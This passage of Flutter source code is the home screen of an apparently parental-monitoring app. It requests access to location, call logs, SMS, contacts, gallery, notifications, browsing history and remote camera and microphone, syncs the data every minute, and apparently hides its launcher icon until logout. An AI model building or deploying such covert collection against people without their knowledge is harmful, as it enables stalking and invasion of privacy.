import 'dart:async';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import '../device_status/device_status_provider.dart';
import '../location/location_provider.dart';
import '../usage_tracking/usage_provider.dart';
import '../auth/welcome_page.dart';
import '../permissions/permission_page.dart';
import '../../platform/tracking_channel.dart';
import '../../platform/launcher_channel.dart';
import '../../services/auth_service.dart';
import '../../services/background_worker.dart';
import '../../services/permission_service.dart';
import '../../services/subscription_service.dart';
import '../../core/constants/app_constants.dart';

// ─────────────────────────────────────────────────────────────────────────────
// Root page
// ─────────────────────────────────────────────────────────────────────────────

class TrackingHomePage extends ConsumerStatefulWidget {
  const TrackingHomePage({super.key});

  @override
  ConsumerState<TrackingHomePage> createState() => _TrackingHomePageState();
}

class _TrackingHomePageState extends ConsumerState<TrackingHomePage>
    with TickerProviderStateMixin {
  bool _serviceRunning = false;
  Timer? _monitorTimer;
  SubscriptionInfo? _subscription;

  late final AnimationController _heartCtrl;
  late final Animation<double> _heartScale;

  late final AnimationController _fadeCtrl;
  late final Animation<double> _fadeAnim;

  @override
  void initState() {
    super.initState();

    _heartCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..repeat(reverse: true);
    _heartScale = Tween<double>(begin: 1.0, end: 1.18).animate(
      CurvedAnimation(parent: _heartCtrl, curve: Curves.easeInOut),
    );

    _fadeCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 700),
    )..forward();
    _fadeAnim = CurvedAnimation(parent: _fadeCtrl, curve: Curves.easeOut);

    _checkServiceStatus();
    _fetchSubscriptionAndCheckPerms();
    _monitorTimer = Timer.periodic(
      const Duration(minutes: 1),
      (_) => BackgroundWorker.captureAllAndSync(),
    );
  }

  @override
  void dispose() {
    _heartCtrl.dispose();
    _fadeCtrl.dispose();
    _monitorTimer?.cancel();
    super.dispose();
  }

  // ── Data loading ────────────────────────────────────────────────────────────

  Future<void> _fetchSubscriptionAndCheckPerms() async {
    final sub = await SubscriptionService.fetch();
    if (!mounted) return;
    setState(() => _subscription = sub);
    await _showPermissionModalIfNeeded(sub.features);
  }

  Future<void> _showPermissionModalIfNeeded(
      SubscriptionFeatures features) async {
    final svc = ref.read(permissionServiceProvider);
    final checks = <Future<bool>>[
      svc.isLocationGranted(),
      svc.isNotificationGranted(),
      svc.isBatteryOptimisationExempt(),
    ];
    if (features.callLogs) checks.add(svc.isCallLogGranted());
    if (features.smsLogs) checks.add(svc.isSmsGranted());
    if (features.contacts) checks.add(svc.isContactsGranted());
    if (features.gallery) checks.add(svc.isMediaGranted());
    if (features.remoteCommands) {
      checks.add(svc.isCameraGranted());
      checks.add(svc.isMicGranted());
    }
    if (features.appUsage) checks.add(svc.isUsageStatsGranted());
    if (features.notifications) checks.add(svc.isNotificationAccessGranted());
    if (features.browsingHistory || features.appBlocking) {
      checks.add(svc.isAccessibilityGranted());
    }
    final results = await Future.wait(checks);
    if (!mounted || results.every((v) => v)) return;
    await Navigator.push<void>(
      context,
      MaterialPageRoute(
        builder: (ctx) => PermissionPage(
          features: features,
          onComplete: () => Navigator.pop(ctx),
        ),
      ),
    );
  }

  Future<void> _checkServiceStatus() async {
    final running = await TrackingChannel.instance.isTrackingActive();
    if (mounted) setState(() => _serviceRunning = running);
  }

  Future<void> _toggleService() async {
    if (_serviceRunning) {
      await TrackingChannel.instance.stopTrackingService();
    } else {
      final permSvc = ref.read(permissionServiceProvider);
      await permSvc.requestEssentialPermissions();
      await TrackingChannel.instance.startTrackingService();
      BackgroundWorker.captureAllAndSync();
    }
    await _checkServiceStatus();
  }

  // ── Dialogs ─────────────────────────────────────────────────────────────────

  Future<void> _confirmLogout(BuildContext context) async {
    final nav = Navigator.of(context);
    final confirmed = await showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => _PremiumLogoutDialog(
        onConfirm: () => Navigator.pop(ctx, true),
        onCancel: () => Navigator.pop(ctx, false),
      ),
    );
    if (confirmed == true && mounted) {
      await TrackingChannel.instance.stopTrackingService();
      await LauncherChannel.showAppIcon();
      await AuthService(AppConstants.backendBaseUrl).logout();
      nav.pushAndRemoveUntil(
        MaterialPageRoute(builder: (_) => const WelcomePage()),
        (_) => false,
      );
    }
  }

  Future<void> _confirmRemoveDevice(BuildContext context) async {
    final nav = Navigator.of(context);

    final confirmed = await showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => _PremiumRemoveDeviceDialog(
        onConfirm: () => Navigator.pop(ctx, true),
        onCancel: () => Navigator.pop(ctx, false),
      ),
    );

    if (confirmed != true || !mounted) return;

    // Loading overlay
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => const _PremiumDeletingOverlay(),
    );

    await TrackingChannel.instance.stopTrackingService();
    await AuthService(AppConstants.backendBaseUrl).removeDevice();

    if (!mounted) return;
    nav.pop(); // close loading overlay

    // Uninstall guide
    await showDialog(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => _PremiumUninstallGuideDialog(
        onDone: () => Navigator.pop(ctx),
      ),
    );

    if (!mounted) return;
    nav.pushAndRemoveUntil(
      MaterialPageRoute(builder: (_) => const WelcomePage()),
      (_) => false,
    );
  }

  // ── Build ────────────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFFF4F0FF),
      body: FadeTransition(
        opacity: _fadeAnim,
        child: CustomScrollView(
          physics: const BouncingScrollPhysics(),
          slivers: [
            _buildSliverAppBar(),
            SliverPadding(
              padding: const EdgeInsets.fromLTRB(16, 16, 16, 40),
              sliver: SliverList(
                delegate: SliverChildListDelegate([
                  _AnimatedCard(
                    delay: 0,
                    child: _ServiceStatusCard(
                      running: _serviceRunning,
                      onToggle: _toggleService,
                    ),
                  ),
                  const SizedBox(height: 12),
                  _AnimatedCard(
                    delay: 60,
                    child: _SubscriptionCard(info: _subscription),
                  ),
                  const SizedBox(height: 12),
                  const _AnimatedCard(delay: 120, child: _DeviceStatusCard()),
                  const SizedBox(height: 12),
                  const _AnimatedCard(delay: 180, child: _LocationCard()),
                  const SizedBox(height: 12),
                  const _AnimatedCard(delay: 240, child: _UsageCard()),
                  const SizedBox(height: 12),
                  const _AnimatedCard(delay: 300, child: _PermissionsCard()),
                  const SizedBox(height: 20),
                  _AnimatedCard(
                    delay: 360,
                    child: _CaringDeleteSection(
                      onRemoveDevice: () => _confirmRemoveDevice(context),
                    ),
                  ),
                ]),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSliverAppBar() {
    return SliverAppBar(
      expandedHeight: 180,
      pinned: true,
      backgroundColor: const Color(0xFF6C63FF),
      elevation: 0,
      actions: [
        Padding(
          padding: const EdgeInsets.only(right: 8.0),
          child: _PremiumLogoutButton(
            onPressed: () => _confirmLogout(context),
          ),
        ),
      ],
      flexibleSpace: FlexibleSpaceBar(
        collapseMode: CollapseMode.parallax,
        background: _PremiumHeaderBanner(
          serviceRunning: _serviceRunning,
          heartScale: _heartScale,
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Premium Logout Button with Hover Animation
// ─────────────────────────────────────────────────────────────────────────────

class _PremiumLogoutButton extends StatefulWidget {
  const _PremiumLogoutButton({required this.onPressed});

  final VoidCallback onPressed;

  @override
  State<_PremiumLogoutButton> createState() => _PremiumLogoutButtonState();
}

class _PremiumLogoutButtonState extends State<_PremiumLogoutButton>
    with SingleTickerProviderStateMixin {
  late final AnimationController _hoverCtrl;
  late final Animation<double> _scale;
  late final Animation<double> _shadowOpacity;

  @override
  void initState() {
    super.initState();
    _hoverCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 300),
    );
    _scale = Tween<double>(begin: 1.0, end: 1.12).animate(
      CurvedAnimation(parent: _hoverCtrl, curve: Curves.easeOutCubic),
    );
    _shadowOpacity = Tween<double>(begin: 0.0, end: 0.4).animate(
      CurvedAnimation(parent: _hoverCtrl, curve: Curves.easeOut),
    );
  }

  @override
  void dispose() {
    _hoverCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _hoverCtrl,
      builder: (_, child) => Transform.scale(
        scale: _scale.value,
        child: Container(
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.2 * _shadowOpacity.value),
                blurRadius: 12 * _shadowOpacity.value,
                spreadRadius: 2 * _shadowOpacity.value,
              ),
            ],
          ),
          child: child,
        ),
      ),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: widget.onPressed,
          onHover: (hovering) {
            hovering ? _hoverCtrl.forward() : _hoverCtrl.reverse();
          },
          customBorder: const CircleBorder(),
          child: Padding(
            padding: const EdgeInsets.all(10),
            child: Container(
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: Colors.white.withOpacity(0.2),
              ),
              padding: const EdgeInsets.all(8),
              child: const Icon(
                Icons.logout_rounded,
                color: Colors.white,
                size: 20,
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Premium Header Banner with Enhanced Animations
// ─────────────────────────────────────────────────────────────────────────────

class _PremiumHeaderBanner extends StatelessWidget {
  const _PremiumHeaderBanner({
    required this.serviceRunning,
    required this.heartScale,
  });

  final bool serviceRunning;
  final Animation<double> heartScale;

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [Color(0xFF5B54D4), Color(0xFF9B84FF)],
        ),
      ),
      child: SafeArea(
        child: Padding(
          padding: const EdgeInsets.fromLTRB(20, 12, 20, 20),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              // Animated heart with multi-layer glow ring
              SizedBox(
                width: 90,
                height: 90,
                child: Stack(
                  alignment: Alignment.center,
                  children: [
                    // Outer ripple effect
                    AnimatedBuilder(
                      animation: heartScale,
                      builder: (_, __) => Opacity(
                        opacity: serviceRunning
                            ? (heartScale.value - 1.0) / 0.18 * 0.25
                            : 0,
                        child: Container(
                          width: 110,
                          height: 110,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            border: Border.all(
                              color: Colors.white,
                              width: 1,
                            ),
                          ),
                        ),
                      ),
                    ),
                    // Mid glow ring
                    AnimatedBuilder(
                      animation: heartScale,
                      builder: (_, __) => Opacity(
                        opacity: serviceRunning
                            ? (heartScale.value - 1.0) / 0.18 * 0.3
                            : 0,
                        child: Container(
                          width: 92,
                          height: 92,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            border: Border.all(
                              color: Colors.white,
                              width: 1.2,
                            ),
                          ),
                        ),
                      ),
                    ),
                    // Inner circle + icon
                    AnimatedBuilder(
                      animation: heartScale,
                      builder: (_, child) => Transform.scale(
                        scale: serviceRunning ? heartScale.value : 1.0,
                        child: child,
                      ),
                      child: Container(
                        width: 70,
                        height: 70,
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.2),
                          shape: BoxShape.circle,
                          border: Border.all(
                            color: Colors.white.withOpacity(0.4),
                            width: 2.5,
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: Colors.white.withOpacity(0.3),
                              blurRadius: 20,
                              spreadRadius: 2,
                            ),
                          ],
                        ),
                        child: AnimatedSwitcher(
                          duration: const Duration(milliseconds: 500),
                          transitionBuilder: (child, anim) =>
                              ScaleTransition(scale: anim, child: child),
                          child: Icon(
                            serviceRunning
                                ? Icons.favorite_rounded
                                : Icons.favorite_border_rounded,
                            key: ValueKey(serviceRunning),
                            color: Colors.white,
                            size: 36,
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 18),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    const Text(
                      'Your Parent is',
                      style: TextStyle(
                        color: Colors.white70,
                        fontSize: 13,
                        fontWeight: FontWeight.w500,
                        letterSpacing: 0.5,
                      ),
                    ),
                    const SizedBox(height: 3),
                    ShaderMask(
                      shaderCallback: (bounds) => const LinearGradient(
                        colors: [Colors.white, Colors.white70],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ).createShader(bounds),
                      child: const Text(
                        'Caring for You 💙',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 24,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 0.4,
                          height: 1.1,
                        ),
                      ),
                    ),
                    const SizedBox(height: 8),
                    AnimatedSwitcher(
                      duration: const Duration(milliseconds: 600),
                      transitionBuilder: (child, anim) =>
                          FadeTransition(opacity: anim, child: child),
                      child: Row(
                        key: ValueKey(serviceRunning),
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          AnimatedContainer(
                            duration: const Duration(milliseconds: 400),
                            width: 9,
                            height: 9,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              color: serviceRunning
                                  ? Colors.greenAccent.shade200
                                  : Colors.white38,
                              boxShadow: serviceRunning
                                  ? [
                                      BoxShadow(
                                        color: Colors.greenAccent.shade200
                                            .withOpacity(0.6),
                                        blurRadius: 8,
                                        spreadRadius: 1,
                                      ),
                                    ]
                                  : [],
                            ),
                          ),
                          const SizedBox(width: 7),
                          Text(
                            serviceRunning
                                ? 'Monitoring active — stay safe'
                                : 'Monitoring paused',
                            style: TextStyle(
                              color: serviceRunning
                                  ? Colors.greenAccent.shade100
                                  : Colors.white54,
                              fontSize: 12,
                              fontWeight: FontWeight.w600,
                              letterSpacing: 0.3,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Staggered entrance wrapper
// ─────────────────────────────────────────────────────────────────────────────

class _AnimatedCard extends StatefulWidget {
  const _AnimatedCard({required this.child, required this.delay});

  final Widget child;
  final int delay; // milliseconds

  @override
  State<_AnimatedCard> createState() => _AnimatedCardState();
}

class _AnimatedCardState extends State<_AnimatedCard>
    with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  late final Animation<Offset> _slide;
  late final Animation<double> _fade;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    );
    _slide = Tween<Offset>(
      begin: const Offset(0, 0.25),
      end: Offset.zero,
    ).animate(CurvedAnimation(parent: _ctrl, curve: Curves.easeOutCubic));
    _fade = CurvedAnimation(parent: _ctrl, curve: Curves.easeOut);

    Future.delayed(Duration(milliseconds: widget.delay), () {
      if (mounted) _ctrl.forward();
    });
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return FadeTransition(
      opacity: _fade,
      child: SlideTransition(position: _slide, child: widget.child),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Service status card (animated background)
// ─────────────────────────────────────────────────────────────────────────────

class _ServiceStatusCard extends StatefulWidget {
  const _ServiceStatusCard({required this.running, required this.onToggle});

  final bool running;
  final VoidCallback onToggle;

  @override
  State<_ServiceStatusCard> createState() => _ServiceStatusCardState();
}

class _ServiceStatusCardState extends State<_ServiceStatusCard>
    with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  late final Animation<Color?> _bgColor;
  late final Animation<Color?> _borderColor;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 700),
      value: widget.running ? 1.0 : 0.0,
    );
    _bgColor = ColorTween(
      begin: Colors.grey.shade100,
      end: Colors.green.shade50,
    ).animate(_ctrl);
    _borderColor = ColorTween(
      begin: Colors.grey.shade200,
      end: Colors.green.shade200,
    ).animate(_ctrl);
  }

  @override
  void didUpdateWidget(_ServiceStatusCard old) {
    super.didUpdateWidget(old);
    if (old.running != widget.running) {
      widget.running ? _ctrl.forward() : _ctrl.reverse();
    }
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _ctrl,
      builder: (_, child) => Container(
        decoration: BoxDecoration(
          color: _bgColor.value,
          borderRadius: BorderRadius.circular(18),
          border: Border.all(color: _borderColor.value!, width: 2),
          boxShadow: [
            BoxShadow(
              color: widget.running
                  ? Colors.green.withOpacity(0.15)
                  : Colors.black.withOpacity(0.05),
              blurRadius: 15,
              offset: const Offset(0, 5),
            ),
          ],
        ),
        padding: const EdgeInsets.all(20),
        child: child,
      ),
      child: Row(
        children: [
          AnimatedSwitcher(
            duration: const Duration(milliseconds: 500),
            transitionBuilder: (child, anim) =>
                ScaleTransition(scale: anim, child: child),
            child: Icon(
              widget.running
                  ? Icons.shield_rounded
                  : Icons.shield_outlined,
              key: ValueKey(widget.running),
              color: widget.running
                  ? Colors.green.shade600
                  : Colors.grey.shade400,
              size: 50,
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                AnimatedSwitcher(
                  duration: const Duration(milliseconds: 400),
                  child: Text(
                    widget.running ? 'Device Monitor Active' : 'Device Monitor Stopped',
                    key: ValueKey(widget.running),
                    style: TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.w800,
                      color: widget.running
                          ? Colors.green.shade700
                          : Colors.grey.shade600,
                    ),
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  widget.running
                      ? 'GPS, usage & security monitoring running'
                      : 'Tap switch to start monitoring',
                  style: TextStyle(
                    fontSize: 13,
                    color: widget.running
                        ? Colors.green.shade500
                        : Colors.grey.shade400,
                    fontWeight: FontWeight.w500,
                  ),
                ),
              ],
            ),
          ),
          AnimatedSwitcher(
            duration: const Duration(milliseconds: 400),
            transitionBuilder: (child, anim) =>
                ScaleTransition(scale: anim, child: child),
            child: Switch(
              key: ValueKey(widget.running),
              value: widget.running,
              onChanged: (_) => widget.onToggle(),
              activeColor: Colors.green.shade600,
              inactiveThumbColor: Colors.grey.shade400,
            ),
          ),
        ],
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Device status card
// ─────────────────────────────────────────────────────────────────────────────

class _DeviceStatusCard extends ConsumerWidget {
  const _DeviceStatusCard();

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final status = ref.watch(deviceStatusProvider);
    return _SectionCard(
      icon: Icons.phone_android_rounded,
      title: 'Device Status',
      child: status.when(
        data: (s) => s == null
            ? const _EmptyState(label: 'No data yet')
            : Row(
                children: [
                  _StatChip(
                    icon: Icons.battery_std_rounded,
                    label: '${s.batteryLevel}%${s.isCharging ? ' ⚡' : ''}',
                    color: s.batteryLevel > 20
                        ? Colors.green.shade600
                        : Colors.red.shade600,
                  ),
                  const SizedBox(width: 10),
                  _StatChip(
                    icon: Icons.wifi_rounded,
                    label: s.networkType,
                    color: Colors.blue.shade600,
                  ),
                ],
              ),
        loading: () => const LinearProgressIndicator(),
        error: (e, _) => Text('Error: $e',
            style: const TextStyle(color: Colors.red, fontSize: 12)),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Location card
// ─────────────────────────────────────────────────────────────────────────────

class _LocationCard extends ConsumerWidget {
  const _LocationCard();

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final locations = ref.watch(recentLocationsProvider);
    return _SectionCard(
      icon: Icons.location_on_rounded,
      title: 'Recent Locations',
      trailing: IconButton(
        icon: const Icon(Icons.my_location_rounded, size: 18),
        onPressed: () => ref.invalidate(captureLocationProvider),
        tooltip: 'Capture now',
        visualDensity: VisualDensity.compact,
        color: const Color(0xFF6C63FF),
      ),
      child: locations.when(
        data: (list) => list.isEmpty
            ? const _EmptyState(label: 'No locations captured yet')
            : Column(
                children: list.take(3).map((l) {
                  return _LocationRow(location: l);
                }).toList(),
              ),
        loading: () => const LinearProgressIndicator(),
        error: (e, _) => Text('Error: $e',
            style: const TextStyle(color: Colors.red, fontSize: 12)),
      ),
    );
  }
}

class _LocationRow extends StatelessWidget {
  const _LocationRow({required this.location});

  final dynamic location;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: Row(
        children: [
          Icon(Icons.location_pin, size: 16, color: Colors.red.shade400),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              '${location.latitude.toStringAsFixed(5)}, '
              '${location.longitude.toStringAsFixed(5)}',
              style: const TextStyle(fontSize: 13, fontWeight: FontWeight.w500),
            ),
          ),
          Text(
            location.capturedAt.toLocal().toString().substring(0, 16),
            style: const TextStyle(fontSize: 11, color: Colors.black45),
          ),
          const SizedBox(width: 8),
          Icon(
            location.synced ? Icons.cloud_done_rounded : Icons.cloud_off_rounded,
            size: 16,
            color: location.synced ? Colors.green : Colors.orange,
          ),
        ],
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Usage card
// ─────────────────────────────────────────────────────────────────────────────

class _UsageCard extends ConsumerWidget {
  const _UsageCard();

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final usage = ref.watch(todayUsageProvider);
    return _SectionCard(
      icon: Icons.bar_chart_rounded,
      title: "Today's App Usage",
      child: usage.when(
        data: (list) => list.isEmpty
            ? const _EmptyState(label: 'No usage data yet')
            : Column(
                children: list.take(5).map((u) {
                  final mins = u.usageDurationMs ~/ 60000;
                  final pct = (mins / 60).clamp(0.0, 1.0);
                  return Padding(
                    padding: const EdgeInsets.symmetric(vertical: 6),
                    child: Row(
                      children: [
                        const Icon(Icons.apps_rounded, size: 16,
                            color: Color(0xFF6C63FF)),
                        const SizedBox(width: 10),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(u.appName,
                                  style: const TextStyle(fontSize: 13, fontWeight: FontWeight.w600)),
                              const SizedBox(height: 4),
                              ClipRRect(
                                borderRadius: BorderRadius.circular(5),
                                child: LinearProgressIndicator(
                                  value: pct,
                                  minHeight: 5,
                                  backgroundColor: Colors.grey.shade200,
                                  color: const Color(0xFF6C63FF),
                                ),
                              ),
                            ],
                          ),
                        ),
                        const SizedBox(width: 12),
                        Text('${mins}m',
                            style: const TextStyle(
                                fontSize: 12, fontWeight: FontWeight.w700, color: Color(0xFF6C63FF))),
                      ],
                    ),
                  );
                }).toList(),
              ),
        loading: () => const LinearProgressIndicator(),
        error: (e, _) => Text('Error: $e',
            style: const TextStyle(color: Colors.red, fontSize: 12)),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Permissions card
// ─────────────────────────────────────────────────────────────────────────────

class _PermissionsCard extends ConsumerWidget {
  const _PermissionsCard();

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final permSvc = ref.read(permissionServiceProvider);
    return _SectionCard(
      icon: Icons.verified_user_rounded,
      title: 'Special Permissions',
      child: Column(
        children: [
          _PermRow(
            icon: Icons.notifications_rounded,
            label: 'Notification Access',
            sub: 'Required to capture notifications',
            onGrant: permSvc.openNotificationAccessSettings,
          ),
          _PermRow(
            icon: Icons.bar_chart_rounded,
            label: 'Usage Stats Access',
            sub: 'Required to track app usage',
            onGrant: permSvc.openUsageStatsSettings,
          ),
          _PermRow(
            icon: Icons.call_rounded,
            label: 'Call Log Access',
            sub: 'Required to capture call history',
            onGrant: () => permSvc.requestCallLogPermission(),
          ),
          _PermRow(
            icon: Icons.contacts_rounded,
            label: 'Contacts Access',
            sub: 'Required to capture contacts',
            onGrant: () => permSvc.requestContactsPermission(),
          ),
          _PermRow(
            icon: Icons.photo_library_rounded,
            label: 'Media Access',
            sub: 'Required to capture gallery items',
            onGrant: () => permSvc.requestMediaPermission(),
          ),
          _PermRow(
            icon: Icons.accessibility_new_rounded,
            label: 'Accessibility Service',
            sub: 'Required for app blocking',
            onGrant: permSvc.openAccessibilitySettings,
          ),
        ],
      ),
    );
  }
}

class _PermRow extends StatelessWidget {
  const _PermRow({
    required this.icon,
    required this.label,
    required this.sub,
    required this.onGrant,
  });

  final IconData icon;
  final String label;
  final String sub;
  final VoidCallback onGrant;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: ListTile(
        dense: true,
        contentPadding: EdgeInsets.zero,
        leading: Icon(icon, size: 20, color: const Color(0xFF6C63FF)),
        title: Text(label, style: const TextStyle(fontSize: 13, fontWeight: FontWeight.w600)),
        subtitle: Text(sub,
            style: const TextStyle(fontSize: 11, color: Colors.black45)),
        trailing: TextButton(
          onPressed: onGrant,
          style: TextButton.styleFrom(
            foregroundColor: const Color(0xFF6C63FF),
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            minimumSize: Size.zero,
            tapTargetSize: MaterialTapTargetSize.shrinkWrap,
          ),
          child: const Text('Grant', style: TextStyle(fontSize: 12, fontWeight: FontWeight.w700)),
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Subscription card
// ─────────────────────────────────────────────────────────────────────────────

class _SubscriptionCard extends StatelessWidget {
  const _SubscriptionCard({required this.info});

  final SubscriptionInfo? info;

  @override
  Widget build(BuildContext context) {
    if (info == null) {
      return Container(
        decoration: BoxDecoration(
          color: Colors.white,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: Colors.grey.shade200),
        ),
        padding: const EdgeInsets.all(16),
        child: Row(
          children: [
            SizedBox(
              width: 18,
              height: 18,
              child: CircularProgressIndicator(
                  strokeWidth: 2.5, color: Colors.grey.shade400),
            ),
            const SizedBox(width: 12),
            Text('Loading subscription…',
                style: TextStyle(fontSize: 13, color: Colors.grey.shade500, fontWeight: FontWeight.w500)),
          ],
        ),
      );
    }
    final isActive = info!.isActive;
    final planName = info!.planName ?? 'Free';
    final expiry = info!.expiresAt;
    final col = isActive ? Colors.green.shade700 : Colors.orange.shade700;
    return Container(
      decoration: BoxDecoration(
        color: isActive ? Colors.green.shade50 : Colors.orange.shade50,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: isActive ? Colors.green.shade200 : Colors.orange.shade200,
          width: 1.5,
        ),
        boxShadow: [
          BoxShadow(
            color: isActive
                ? Colors.green.withOpacity(0.1)
                : Colors.orange.withOpacity(0.1),
            blurRadius: 12,
            offset: const Offset(0, 3),
          ),
        ],
      ),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 15),
      child: Row(
        children: [
          Icon(Icons.workspace_premium_rounded, color: col, size: 28),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  '$planName Plan',
                  style: TextStyle(
                      fontWeight: FontWeight.w800, color: col, fontSize: 14),
                ),
                if (expiry != null)
                  Text(
                    'Expires ${expiry.day}/${expiry.month}/${expiry.year}',
                    style: TextStyle(
                        fontSize: 11, color: col.withOpacity(0.8), fontWeight: FontWeight.w500),
                  )
                else if (isActive)
                  Text('No expiry',
                      style: TextStyle(
                          fontSize: 11, color: col.withOpacity(0.8), fontWeight: FontWeight.w500)),
              ],
            ),
          ),
          if (!isActive)
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 7),
              decoration: BoxDecoration(
                  color: Colors.orange.shade600,
                  borderRadius: BorderRadius.circular(20),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.orange.withOpacity(0.3),
                      blurRadius: 8,
                      offset: const Offset(0, 2),
                    ),
                  ]),
              child: const Text('Upgrade',
                  style: TextStyle(
                      color: Colors.white,
                      fontSize: 12,
                      fontWeight: FontWeight.w800)),
            ),
        ],
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Caring delete section — Premium version with smooth animations
// ─────────────────────────────────────────────────────────────────────────────

class _CaringDeleteSection extends StatefulWidget {
  const _CaringDeleteSection({required this.onRemoveDevice});

  final VoidCallback onRemoveDevice;

  @override
  State<_CaringDeleteSection> createState() => _CaringDeleteSectionState();
}

class _CaringDeleteSectionState extends State<_CaringDeleteSection>
    with SingleTickerProviderStateMixin {
  late final AnimationController _shakeCtrl;
  late final Animation<double> _shakeAnim;

  @override
  void initState() {
    super.initState();
    _shakeCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _shakeAnim = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _shakeCtrl, curve: Curves.elasticIn),
    );
  }

  @override
  void dispose() {
    _shakeCtrl.dispose();
    super.dispose();
  }

  void _handleDeleteTap() {
    _shakeCtrl.forward().then((_) {
      _shakeCtrl.reset();
      widget.onRemoveDevice();
    });
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        // ── Caring message ────────────────────────────────────────────────
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                const Color(0xFF6C63FF).withOpacity(0.08),
                const Color(0xFF9B84FF).withOpacity(0.08),
              ],
            ),
            borderRadius: BorderRadius.circular(18),
            border: Border.all(
              color: const Color(0xFF6C63FF).withOpacity(0.2),
              width: 1.5,
            ),
            boxShadow: [
              BoxShadow(
                color: const Color(0xFF6C63FF).withOpacity(0.08),
                blurRadius: 12,
                offset: const Offset(0, 4),
              ),
            ],
          ),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                width: 50,
                height: 50,
                decoration: BoxDecoration(
                  color: const Color(0xFF6C63FF).withOpacity(0.15),
                  shape: BoxShape.circle,
                ),
                child: const Icon(
                  Icons.favorite_rounded,
                  color: Color(0xFF6C63FF),
                  size: 26,
                ),
              ),
              const SizedBox(width: 16),
